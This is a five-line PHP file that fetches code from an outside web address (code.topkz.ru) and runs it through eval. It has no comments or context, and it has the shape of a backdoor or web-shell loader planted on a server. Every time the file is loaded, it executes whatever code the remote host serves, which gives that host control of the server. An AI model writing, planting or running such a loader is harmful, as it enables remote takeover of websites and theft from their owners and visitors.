<?php
$path = "https://code.topkz.ru/fgd/8/qkb.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
